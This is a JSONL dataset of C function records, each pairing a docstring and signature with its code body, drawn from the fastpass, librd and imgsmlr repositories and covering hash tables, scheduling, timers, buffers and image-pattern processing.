{"docstring": "/* This does not expand the hash table, that's up to caller. */\n", "func_signal": "static void ht_add(struct htable *ht, const void *new, size_t h)", "code": "{\n\tsize_t i;\n\tuintptr_t perfect = ht->perfect_bit;\n\n\ti = hash_bucket(ht, h);\n\n\twhile (entry_is_valid(ht->table[i])) {\n\t\tperfect = 0;\n\t\ti = (i + 1) & ((1 << ht->bits)-1);\n\t}\n\tht->table[i] = make_hval(ht, new, get_hash_ptr_bits(ht, h)|perfect);\n}", "path": "src\\arbiter\\ccan\\htable\\htable.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/**\n * For all source (left-hand) nodes in partition 'partition_index',\n *    selects edges to grant. These are added to 'grants'. For the\n *    first iteration only.\n */\n", "func_signal": "void pim_do_grant_first_it(struct pim_state *state, uint16_t partition_index)", "code": "{\n        uint16_t count, src_partition, dst_adj_index, dst;\n        struct pim_core_state *core = &state->cores[partition_index];\n        struct admission_core_statistics *core_stat = &core->stat;\n\n        /* reset grant edgelist */\n        ga_partd_edgelist_src_reset(&state->grants, partition_index);\n\n        /* for each src in the partition, randomly choose a dst to grant to */\n        uint16_t src;\n        for (src = first_in_partition(partition_index);\n             src <= last_in_partition(partition_index);\n             src++) {\n                uint16_t src_index = PARTITION_IDX(src);\n                uint16_t degree = state->requests_by_src[partition_index].degree[src_index];\n                if (degree == 0)\n                        continue; /* no requests for this src */\n\n                /* pick a random destination to grant to */\n                dst_adj_index = ga_rand(&core->rand_state, degree);\n                dst = state->requests_by_src[partition_index].neigh[src_index][dst_adj_index];\n\n                /* add the granted edge */\n                ga_partd_edgelist_add(&state->grants, src, dst);\n\n                /* record the index of the destination we granted to */\n                core->grant_adj_index[PARTITION_IDX(src)] = dst_adj_index;\n        }\n}", "path": "src\\grant-accept\\pim.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/**\n * For all source (left-hand) nodes in partition 'partition_index',\n *    selects edges to grant. These are added to 'grants'.\n */\n", "func_signal": "void pim_do_grant(struct pim_state *state, uint16_t partition_index)", "code": "{\n        uint16_t count, src_partition;\n        struct pim_core_state *core = &state->cores[partition_index];\n        struct admission_core_statistics *core_stat = &core->stat;\n\n        /* reset grant edgelist */\n        ga_partd_edgelist_src_reset(&state->grants, partition_index);\n\n        /* for each src in the partition, randomly choose a dst to grant to */\n        uint16_t src;\n        for (src = first_in_partition(partition_index);\n             src <= last_in_partition(partition_index);\n             src++) {\n                if (src_is_allocated(core, src))\n                        continue; /* this src has been allocated in this timeslot */\n\n                uint16_t src_index = PARTITION_IDX(src);\n                uint16_t degree = state->requests_by_src[partition_index].degree[src_index];\n                if (degree == 0)\n                        continue; /* no requests for this src */\n\n                /* find an un-allocated destination to grant to */\n                uint8_t tries = MAX_TRIES;\n                uint16_t dst_adj_index, dst;\n                bool dst_is_alloc;\n                do {\n                        dst_adj_index = ga_rand(&core->rand_state, degree);\n                        dst = state->requests_by_src[partition_index].neigh[src_index][dst_adj_index];\n                        dst_is_alloc = dst_is_allocated(state, dst);\n                } while (dst_is_alloc && (--tries > 0));\n\n                if (dst_is_alloc)\n                        continue; /* couldn't find a free dst*/\n\n                /* add the granted edge */\n                ga_partd_edgelist_add(&state->grants, src, dst);\n\n                /* record the index of the destination we granted to */\n                core->grant_adj_index[PARTITION_IDX(src)] = dst_adj_index;\n        }\n}", "path": "src\\grant-accept\\pim.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/**\n * Flush the backlog to state, for all partitions\n */\n", "func_signal": "void pim_flush_backlog(struct pim_state *state)", "code": "{\n        uint16_t partition;\n        for (partition = 0; partition < N_PARTITIONS; partition++) {\n                if (is_empty_bin(state->new_demands[partition]))\n                    continue;\n                _flush_backlog_now(state, partition);\n        }\n        adm_log_forced_backlog_flush(&state->stat);\n}", "path": "src\\grant-accept\\pim.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/**\n * Constructs and sends one packet.\n */\n", "func_signal": "static struct sk_buff *fpproto_make_skb(struct sock *sk, struct fpproto_pktdesc *pd)", "code": "{\n\tstruct fastpass_sock *fp = fastpass_sk(sk);\n\tstruct inet_sock *inet = inet_sk(sk);\n\tint payload_len;\n\tconst int max_header = MAX_HEADER;\n\tstruct sk_buff *skb = NULL;\n\tint err;\n\tu8 *data;\n\n\t/* allocate request skb */\n\tskb = sock_alloc_send_skb(sk, FASTPASS_MAX_PAYLOAD + max_header, 1, &err);\n\tif (!skb)\n\t\tgoto alloc_err;\n\n\t/* reserve space for headers */\n\tskb_reserve(skb, max_header);\n\t/* set skb fastpass packet size */\n\tskb_reset_transport_header(skb);\n\n\tif (unlikely(pd->n_areq > FASTPASS_PKT_MAX_AREQ)) {\n\t\tFASTPASS_CRIT(\"got n_areq larger than max! n_areq %d max %d send_reset %d seqno %llu\\n\",\n\t\t\t\tpd->n_areq, FASTPASS_PKT_MAX_AREQ, pd->send_reset,\n\t\t\t\tpd->seqno);\n\t\tkfree_skb(skb);\n\t\treturn NULL;\n\t}\n\n\t/* encode the packet from the descriptor */\n\tdata = &skb->data[0];\n\tpayload_len = fpproto_encode_packet(pd, data, FASTPASS_MAX_PAYLOAD,\n\t\t\tinet->inet_saddr, inet->inet_daddr, 26);\n\n\t/* adjust the size of the skb based on encoded size */\n\tif (unlikely((payload_len > FASTPASS_MAX_PAYLOAD) || (payload_len < 0))) {\n\t\tFASTPASS_CRIT(\"invalid packet encoding! len %d max %u n_areq %d send_reset %d seqno %llu\\n\",\n\t\t\t\tpayload_len, FASTPASS_MAX_PAYLOAD, pd->n_areq, pd->send_reset,\n\t\t\t\tpd->seqno);\n\t\tkfree_skb(skb);\n\t\treturn NULL;\n\t}\n\n\tskb_put(skb, payload_len);\n\treturn skb;\n\nalloc_err:\n\tfp->stat.skb_alloc_error++;\n\tfp_debug(\"could not alloc skb of size %d\\n\",\n\t\t\tFASTPASS_MAX_PAYLOAD + max_header);\n\treturn NULL;\n}", "path": "src\\kernel-mod\\fastpass_proto.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/* Nanoseconds per operation */\n", "func_signal": "static size_t normalize(const struct timeval *start,\n\t\t\tconst struct timeval *stop,\n\t\t\tunsigned int num)", "code": "{\n\tstruct timeval diff;\n\n\ttimersub(stop, start, &diff);\n\n\t/* Floating point is more accurate here. */\n\treturn (double)(diff.tv_sec * 1000000 + diff.tv_usec)\n\t\t/ num * 1000;\n}", "path": "src\\arbiter\\ccan\\htable\\tools\\stringspeed.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "// Constructs a complete bipartite graph\n", "func_signal": "void create_complete_bipartite_graph(struct graph_structure *structure,\n                                     struct graph_edges *edges, uint8_t n)", "code": "{\n  \n    int i, j;\n    for (i = 0; i < n; i++) {\n        for (j = n; j < 2 * n; j++)\n            add_edge(structure, edges, i, j);\n    }\n}", "path": "src\\graph-algo\\test_euler_split.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/**\n * Adds demands from 'num_srcs' sources, each to 'num_dsts_per_src'.\n *    Demand is for 'flow_size' tslots.\n */\n", "func_signal": "static void add_initial_requests(struct comm_core_state *core,\n\t\tuint32_t num_srcs, uint32_t num_dsts_per_src, uint32_t flow_size)", "code": "{\n\tuint32_t src;\n\tuint32_t i;\n\tfor (src = 0; src < num_srcs; src++)\n\t\tfor (i = 0; i < num_dsts_per_src; i++)\n\t\t\tadd_backlog(g_admissible_status(),\n\t\t\t\t\tsrc, (src + 1 + i) % num_srcs , flow_size);\n\n\tflush_backlog(g_admissible_status());\n}", "path": "src\\arbiter\\stress_test_core.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/**\n * Return true if the src is already allocated, false otherwise.\n */\n", "func_signal": "static inline __attribute__((always_inline))\nbool src_is_allocated(struct pim_core_state *core, uint16_t src)", "code": "{\n        uint16_t src_index = PARTITION_IDX(src);\n        return ((core->src_endnodes[PIM_BITMASK_WORD(src_index)] >>\n                 PIM_BITMASK_SHIFT(src_index)) & 0x1);\n}", "path": "src\\grant-accept\\pim.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/**\n * Frees a buffer that must have been previously unlinked from the bufh.\n */\n", "func_signal": "void rd_buf_destroy0 (rd_buf_t *rb)", "code": "{\n\tif (BIT_TEST(rb->rb_flags, RD_BUF_F_OWNER))\n\t\tfree(rb->rb_orig);\n\tfree(rb);\n}", "path": "rdbuf.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * Thread 'rdt' may be NULL to indicate the current thread.\n */\n", "func_signal": "rd_timer_t *rd_timer_new (rd_timer_type_t type, rd_thread_t *rdt,\n\t\t\t  rd_thread_event_f(*callback), void *ptr)", "code": "{\n\trd_timer_t *rt;\n\n\trt = calloc(1, sizeof(*rt));\n\n\trd_timer_init(rt, type, rdt, callback, ptr);\n\n\treturn rt;\n}", "path": "rdtimer.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * NOTE: rd_timers_lock must be held.\n */\n", "func_signal": "static inline void rd_timers_next_update (const rd_timer_t *rt_first)", "code": "{\n\n\tif (rt_first)\n\t\tTS_TO_TIMESPEC(&rd_timers_next_ts, rt_first->rt_next);\n\telse /* No timer, sleep for an hour. */\n\t\tTS_TO_TIMESPEC(&rd_timers_next_ts,\n\t\t\t       rd_clock() + (3600LLU * 1000000LLU));\n\n\trd_cond_signal(&rd_timers_cond);\n}", "path": "rdtimer.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * NOTE: rd_timers_lock must be held.\n */\n", "func_signal": "void rd_timer_stop0 (rd_timer_t *rt)", "code": "{\n\n\tif (rt->rt_next != 0) {\n\t\tif (!rt->rt_called &&\n\t\t    LIST_FIRST(&rd_timers) == rt)\n\t\t\trd_timers_next_update(LIST_NEXT(rt, rt_link));\n\t\t\t\n\t\tLIST_REMOVE(rt, rt_link);\n\t\trt->rt_next = 0;\n\t}\n}", "path": "rdtimer.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * Adds an unmanageble timer.\n * Once it has been added it will either be removed automatically\n * after the first period has elapsed (RD_TIMER_ONCE) or kept running\n * forever (RD_TIMER_RECURR).\n */\n", "func_signal": "void rd_timer_add (rd_timer_type_t type, unsigned int interval_ms,\n\t\t   rd_thread_t *rdt, rd_thread_event_f(*callback), void *ptr)", "code": "{\n\trd_timer_t *rt;\n\n\trt = rd_timer_new(type, rdt, callback, ptr);\n\trt->rt_flags |= RD_TIMER_F_ATOMIC;\n\trd_timer_start(rt, interval_ms);\n}", "path": "rdtimer.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * RD_MEMCTX_LOCK must be held.\n */\n", "func_signal": "static void rd_memctx_ptr_free (rd_memctx_t *rmc, rd_memctx_ptr_t *rmcp)", "code": "{\n\n\tassert(rmc->rmc_out > 0);\n\trmc->rmc_out--;\n\n\tif (likely(rmcp->rmcp_size)) {\n\t\tassert(rmc->rmc_bytes_out > 0);\n\t\trmc->rmc_bytes_out -= rmcp->rmcp_size;\n\t}\n\n\tTAILQ_REMOVE(&rmc->rmc_ptrs, rmcp, rmcp_link);\n\n\tfree(rmcp);\n}", "path": "rdmem.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/** FIXME: THREAD SAFE */\n/** FIXME: Use (s)size_t for >32 bit sizes? */\n", "func_signal": "static inline void rd_bufh_update_len (rd_bufh_t *rbh, rd_buf_t *rb,\n\t\t\t\t       int32_t len)", "code": "{\n\trb->rb_len += len;\n\trbh->rbh_len += len;\n}", "path": "rdbuf.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * A handle is assigned to a worker thread as to guarantee that all\n * IO operations are performed in order for the same fd.\n * If the currently assigned thread is blocking too long (for another fd)\n * the fd is migrated to a free thread.\n */\n", "func_signal": "static void rd_io_hnd_enqueue_worker (rd_io_hnd_t *rioh, int events)", "code": "{\n\trd_thread_t *rdt;\n\trd_io_hnd_event_t *rioev;\n\n\tif (rioh->rioh_flags & RD_IO_F_NONBLOCKING) {\n\t\t/* The handler has promised us to only perform nonblocking\n\t\t * operations, we can thus do it from the main io thread\n\t\t * instead of a worker thread. */\n\t\trd_io_hnd_call(rioh, events);\n\t\treturn;\n\t}\n\n\t/* Enqueue event on io worker thread. */\n\trioev = malloc(sizeof(*rioev));\n\n\trioev->rioev_rioh   = rioh;\n\trioev->rioev_events = events;\n\n\tif (!(rdt = rioh->rioh_worker_thread))\n\t\trdt = rd_io_worker_get();\n\n\trd_io_hnd_keep(rioh);\n\trd_thread_event_add(rdt, rd_io_hnd_work, rioev);\n}", "path": "rdiothread.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * Read 'len' messages and return the first buffer that points to that\n * payload.\n */\n", "func_signal": "rd_buf_t *rd_bufh_recv (rd_bufh_t *rbh, int s, uint32_t len)", "code": "{\n\tint r;\n\trd_buf_t *rb;\n\n\trb = rd_bufh_get_buf(rbh, NULL, len, 0);\n\n\tr = recv(s, rb->rb_data+rb->rb_len, len, 0);\n\tif (r == -1)\n\t\treturn NULL;\n\n\trd_bufh_update_len(rbh, rb, r);\n\n\treturn rb;\n}", "path": "rdbuf.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * NOTE: rd_timers_lock must be held.\n */\n", "func_signal": "void rd_timer_start0 (rd_timer_t *rt, unsigned int interval_ms,\n\t\t      int next_update)", "code": "{\n\n\trd_timer_stop0(rt);\n\n\trt->rt_next = rd_clock() + (interval_ms * 1000);\n\n\tif (rt->rt_next < TIMESPEC_TO_TS(&rd_timers_next_ts)) {\n\t\t/* This timer will be the next one to fire. */\n\t\tLIST_INSERT_HEAD(&rd_timers, rt, rt_link);\n\t\tif (next_update)\n\t\t\trd_timers_next_update(rt);\n\t} else {\n\t\t/* FIXME: Smarter sorted list insertion, i.e. ,at least\n\t\t *        choose whether to start scanning from top or bottom\n\t\t *        of the list */\n\t\tLIST_INSERT_SORTED(&rd_timers, rt, rt_link, rd_timer_cmp);\n\t}\n}", "path": "rdtimer.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * rd_bitvec_ffs() and rd_bitvec_fls() returns the bit number\n * according to ffs(3).\n */\n", "func_signal": "uint64_t rd_bitvec_fxs (const rd_bitvec_t *rbv, rd_bitvec_op_t op)", "code": "{\n\tint bucket = 0;\n\tuint32_t bit = 0;\n\n\tif (op == RD_BITVEC_OP_FFS) {\n\t\tfor (bucket = 0 ; bucket < rbv->rbv_buckets ; bucket++)\n\t\t\tif (rbv->rbv_b[bucket] &&\n\t\t\t    (bit = ffs(rbv->rbv_b[bucket])))\n\t\t\t\tbreak;\n\n\t} else if (op == RD_BITVEC_OP_FLS) {\n\t\tfor (bucket = rbv->rbv_buckets - 1 ; bucket >= 0 ; bucket--) {\n\t\t\tif (rbv->rbv_b[bucket] &&\n\t\t\t    (bit = __builtin_clz(rbv->rbv_b[bucket]))) {\n\t\t\t\tbit = (8 * sizeof(*rbv->rbv_b)) - bit;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\n\n\t} else {\n\t\tassert(!*\"unknown RD_BITVEC_OP_..\");\n\t}\n\n\treturn (uint64_t)bit + (uint64_t)(bucket * (8 * sizeof(*rbv->rbv_b)));\n}", "path": "rdbits.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * Initializes a cyclic state or updates it to the next index.\n */\n", "func_signal": "static inline struct rdstr_cyclic *rdstr_cyclic_get (struct rdstr_cyclic *cyc,\n\t\t\t\t\t\t     int size)", "code": "{\n\t\n\tif (unlikely(cyc->size == 0)) {\n\t\t/* Not initialized. */\n\n\t\t/* Allocate cyclic buffer array. */\n\t\tcyc->size = size;\n\t\tcyc->buf = calloc(sizeof(*cyc->buf), cyc->size);\n\t\tcyc->len = calloc(sizeof(*cyc->len), cyc->size);\n\t} else /* Update to the next pointer. */\n\t\tcyc->i = (cyc->i + 1) % cyc->size;\n\n\treturn cyc;\n}", "path": "rdstring.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * Frees all memory allocated with the memctx and returns the\n * number of bytes freed.\n * Requires RD_MEMCTX_F_TRACK to be set.\n */\n", "func_signal": "size_t rd_memctx_freeall (rd_memctx_t *rmc)", "code": "{\n\trd_memctx_ptr_t *rmcp;\n\tsize_t sum = 0;\n\n\tassert(BIT_TEST(rmc->rmc_flags, RD_MEMCTX_F_TRACK));\n\n\tRD_MEMCTX_LOCK(rmc);\n\n\twhile ((rmcp = TAILQ_FIRST(&rmc->rmc_ptrs))) {\n\t\tsum += rmcp->rmcp_size;\n\t\trd_memctx_ptr_free(rmc, rmcp);\n\t}\n\n\tRD_MEMCTX_UNLOCK(rmc);\n\t\n\treturn sum;\n}", "path": "rdmem.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/*\n * Moves all buffers from 'src' to tail of 'dst'.\n * 'src' will become empty.\n */\n", "func_signal": "void rd_bufh_move (rd_bufh_t *dst, rd_bufh_t *src)", "code": "{\n\trd_buf_t *rb, *next, *tail;\n\t\n\ttail = TAILQ_LAST(&dst->rbh_bufs, rd_buf_tq_head);\n\tnext = TAILQ_FIRST(&src->rbh_bufs);\n\twhile (next) {\n\t\trb = next;\n\t\tnext = TAILQ_NEXT(next, rb_link);\n\n\t\trd_bufh_buf_insert(dst, tail, rb);\n\t\ttail = rb;\n\t}\n\n\t/* Reset source bufh */\n\tTAILQ_INIT(&src->rbh_bufs);\n\tsrc->rbh_len = 0;\n}", "path": "rdbuf.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * NOTE: THIS IS WORK IN PROGRESS\n **/\n", "func_signal": "rd_avg_t *rd_avg_new (rd_avg_type_t type, int periods, int duration)", "code": "{\n\trd_avg_t *ra;\n\n\tra = calloc(1, sizeof(*ra));\n\n\tra->ra_type     = type;\n\tra->ra_periods  = periods;\n\tra->ra_duration = duration;\n\treturn ra;\n}", "path": "rdavg.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * Frees and unlinks a buffer and updates the length of the buffer head.\n */\n", "func_signal": "void rd_buf_destroy (rd_bufh_t *rbh, rd_buf_t *rb)", "code": "{\n\tTAILQ_REMOVE(&rbh->rbh_bufs, rb, rb_link);\n\trd_bufh_update_len(rbh, rb, -rb->rb_len);\n\trd_buf_destroy0(rb);\n}", "path": "rdbuf.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * Roll-over, stop and perform average calculations on the current period.\n * Set up a new current period.\n */\n", "func_signal": "static void rd_avg_roll (rd_avg_t *ra, rd_ts_t now)", "code": "{\n\tint missed;\n\n\t/* Calculate the average */\n\tra->ra_curr->closed = now;\n\tra->ra_curr->duration = (ra->ra_curr->last ? : now) - ra->ra_start;\n\trd_avg_calc(ra, ra->ra_curr);\n\t\n\t/* Calculate missed periods */\n\tmissed = (now - ra->ra_end) / ra->ra_duration;\n\tra->ra_curr->missed = missed;\n\n\t/* Call application roll callback, if any. */\n\tif (ra->ra_roll_cb)\n\t\tra->ra_roll_cb(ra, ra->ra_curri, ra->ra_opaque);\n\n\t/* Set up new current period */\n\trd_avg_period_next(ra, now);\n}", "path": "rdavg.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * Returns memory information about the designated process.\n */\n", "func_signal": "size_t rd_mem_proc (pid_t pid)", "code": "{\n\tchar path[64];\n\tchar buf[128];\n\tint fd;\n\n\tsprintf(path, \"/proc/%i/statm\", pid);\n\tif ((fd = open(path, O_RDONLY) == -1))\n\t\treturn 0;\n\n\tif (read(fd, buf, sizeof(buf)) < 1) {\n\t\tclose(fd);\n\t\treturn 0;\n\t}\n\n\t/* FIXME: scanf and so on...\n\t *        produce a struct that includes the relevant fields.\n\t * http://elinux.org/Runtime_Memory_Measurement\n\t *\n\t * Then make rd_mem_rss() that returns just the rss field.\n\t */\n}", "path": "rdmem.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * RD_MEMCTX_LOCK must be held\n */\n", "func_signal": "static rd_memctx_ptr_t *rd_memctx_ptr_new (rd_memctx_t *rmc,\n\t\t\t\t\t   size_t size, void **ptr,\n\t\t\t\t\t   rd_memctx_alloc_type_t type)", "code": "{\n\trd_memctx_ptr_t *rmcp;\n\n\trmcp = rd_memctx_alloc0(sizeof(*rmcp) + size, type);\n\t\n\trmcp->rmcp_size = size;\n\t*ptr = rmcp+1;\n\n\tTAILQ_INSERT_TAIL(&rmc->rmc_ptrs, rmcp, rmcp_link);\n\n\treturn rmcp;\n}", "path": "rdmem.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/**\n * See rd_timer_destroy() for proper usage.\n * NOTE: rd_timers_lock must be held.\n */\n", "func_signal": "void rd_timer_destroy0 (rd_timer_t *rt)", "code": "{\n\n\trd_timer_stop0(rt);\n\n\tif (rt->rt_called) {\n\t\trt->rt_flags |= RD_TIMER_F_REMOVED;\n\t\treturn;\n\t}\n\n\tfree(rt);\n}", "path": "rdtimer.c", "repo_name": "edenhill/librd", "stars": 129, "license": "other", "language": "c", "size": 258}
{"docstring": "/*\n * Shuffle pattern: call \"shuffle\" for each region of wavelet-transformed\n * pattern. For each region, blur radius is selected accordingly to its size;\n */\n", "func_signal": "Datum\nshuffle_pattern(PG_FUNCTION_ARGS)", "code": "{\n\tbytea *patternDataSrc = PG_GETARG_BYTEA_P(0);\n\tbytea *patternDataDst;\n\tPatternData *patternDst, *patternSrc;\n\tint size = PATTERN_SIZE;\n\n\tpatternDataDst = (bytea *)palloc(VARSIZE_ANY(patternDataSrc));\n\tmemcpy(patternDataDst, patternDataSrc, VARSIZE_ANY(patternDataSrc));\n\tpatternSrc = (PatternData *)VARDATA_ANY(patternDataSrc);\n\tpatternDst = (PatternData *)VARDATA_ANY(patternDataDst);\n\n\twhile (size > 4)\n\t{\n\t\tsize /= 2;\n\t\tshuffle(patternDst, patternSrc, size, 0, size, size, size / 4);\n\t\tshuffle(patternDst, patternSrc, 0, size, size, size, size / 4);\n\t\tshuffle(patternDst, patternSrc, size, size, size, size, size / 4);\n\t}\n#ifdef DEBUG_INFO\n\tdebugPrintPattern(patternDst, \"/tmp/pattern4.raw\", false);\n#endif\n\n\tPG_FREE_IF_COPY(patternDataSrc, 0);\n\n\tPG_RETURN_POINTER(patternDataDst);\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Transform GD image into pattern.\n */\n", "func_signal": "static Pattern *\nimage2pattern(gdImagePtr im)", "code": "{\n\tgdImagePtr\ttb;\n\tPattern *pattern;\n\tPatternData source;\n\n\t/* Resize image */\n\ttb = gdImageCreateTrueColor(PATTERN_SIZE, PATTERN_SIZE);\n\tif (!tb)\n\t{\n\t\telog(NOTICE, \"Error creating pattern\");\n\t\treturn NULL;\n\t}\n\tgdImageCopyResampled(tb, im, 0, 0, 0, 0, PATTERN_SIZE, PATTERN_SIZE,\n\t\t\tim->sx, im->sy);\n\n\t/* Create source pattern as greyscale image */\n\tmakePattern(tb, &source);\n\tgdImageDestroy(tb);\n\n#ifdef DEBUG_INFO\n\tdebugPrintPattern(&source, \"/tmp/pattern1.raw\", false);\n#endif\n\n\t/* \"Normalize\" intensiveness in the pattern */\n\tnormalizePattern(&source);\n\n#ifdef DEBUG_INFO\n\tdebugPrintPattern(&source, \"/tmp/pattern2.raw\", false);\n#endif\n\n\t/* Allocate pattern */\n\tpattern = (Pattern *)palloc(sizeof(Pattern));\n\tSET_VARSIZE(pattern, sizeof(Pattern));\n\n\t/* Do wavelet transform */\n\twaveletTransform(&pattern->data, &source, PATTERN_SIZE);\n\n#ifdef DEBUG_INFO\n\tdebugPrintPattern(transformed, \"/tmp/pattern3.raw\", true);\n#endif\n\n\treturn pattern;\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Load pattern from jpeg image in bytea.\n */\n", "func_signal": "Datum\njpeg2pattern(PG_FUNCTION_ARGS)", "code": "{\n\tbytea *img = PG_GETARG_BYTEA_P(0);\n\tPattern *pattern;\n\tgdImagePtr im;\n\n\tim = gdImageCreateFromJpegPtr(VARSIZE_ANY_EXHDR(img), VARDATA_ANY(img));\n\tPG_FREE_IF_COPY(img, 0);\n\tif (!im)\n\t{\n\t\telog(NOTICE, \"Error loading jpeg\");\n\t\tPG_RETURN_NULL();\n\t}\n\tpattern = image2pattern(im);\n\tgdImageDestroy(im);\n\n\tif (pattern)\n\t\tPG_RETURN_BYTEA_P(pattern);\n\telse\n\t\tPG_RETURN_NULL();\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Calculate summary of square difference between \"patternA\" and \"patternB\"\n * in rectangle \"(x, y) - (x + sX, y + sY)\".\n */\n", "func_signal": "static float\ncalcDiff(PatternData *patternA, PatternData *patternB, int x, int y,\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tint sX, int sY)", "code": "{\n\tint i, j;\n\tfloat summ = 0.0f, val;\n\tfor (i = x; i < x + sX; i++)\n\t{\n\t\tfor (j = y; j < y + sY; j++)\n\t\t{\n\t\t\tval =   patternA->values[i][j]\n\t\t\t      - patternB->values[i][j];\n\t\t\tsumm += val * val;\n\t\t}\n\t}\n\treturn summ;\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Distance between signatures: mean-square difference between signatures.\n */\n", "func_signal": "Datum\nsignature_distance(PG_FUNCTION_ARGS)", "code": "{\n\tSignature *signatureA = (Signature *)PG_GETARG_POINTER(0);\n\tSignature *signatureB = (Signature *)PG_GETARG_POINTER(1);\n\tfloat distance = 0.0f, val;\n\tint i;\n\n\tfor (i = 0; i < SIGNATURE_SIZE; i++)\n\t{\n\t\tval = signatureA->values[i] - signatureB->values[i];\n\t\tdistance += val * val;\n\t}\n\tdistance = sqrt(distance);\n\n\tPG_RETURN_FLOAT4(distance);\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Make pattern from gd image.\n */\n", "func_signal": "static void\nmakePattern(gdImagePtr im, PatternData *pattern)", "code": "{\n\tint i, j;\n\tfor (i = 0; i < PATTERN_SIZE; i++)\n\t\tfor (j = 0; j < PATTERN_SIZE; j++)\n\t\t{\n\t\t\tint pixel = gdImageGetTrueColorPixel(im, i, j);\n\t\t\tfloat red = (float) gdTrueColorGetRed(pixel) / 255.0,\n\t\t\t\t  green = (float) gdTrueColorGetGreen(pixel) / 255.0,\n\t\t\t\t  blue = (float) gdTrueColorGetBlue(pixel) / 255.0;\n\t\t\tpattern->values[i][j] = sqrt((red * red + green * green + blue * blue) / 3.0f);\n\t\t}\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
{"docstring": "/*\n * Read float4 from string while skipping \" (),\" symbols.\n */\n", "func_signal": "static float\nread_float(char **s, char *type_name, char *orig_string)", "code": "{\n\tchar\tc,\n\t\t   *start;\n\tfloat\tresult;\n\n\twhile (true)\n\t{\n\t\tc = **s;\n\t\tswitch (c)\n\t\t{\n\t\t\tcase ' ':\n\t\t\tcase '(':\n\t\t\tcase ')':\n\t\t\tcase ',':\n\t\t\t\t(*s)++;\n\t\t\t\tcontinue;\n\t\t\tcase '\\0':\n\t\t\t\tereport(ERROR,\n\t\t\t\t\t\t(errcode(ERRCODE_INVALID_TEXT_REPRESENTATION),\n\t\t\t\t\t\t errmsg(\"invalid input syntax for type %s: \\\"%s\\\"\",\n\t\t\t\t\t\t\t\ttype_name, orig_string)));\n\t\t\tdefault:\n\t\t\t\tbreak;\n\t\t}\n\t\tbreak;\n\t}\n\n\tstart = *s;\n\tresult = strtof(start, s);\n\n\tif (start == *s)\n\t\tereport(ERROR,\n\t\t\t\t(errcode(ERRCODE_INVALID_TEXT_REPRESENTATION),\n\t\t\t\t errmsg(\"invalid input syntax for type %s: \\\"%s\\\"\",\n\t\t\t\t\t\ttype_name, orig_string)));\n\n\treturn result;\n}", "path": "imgsmlr.c", "repo_name": "postgrespro/imgsmlr", "stars": 235, "license": "other", "language": "c", "size": 250}
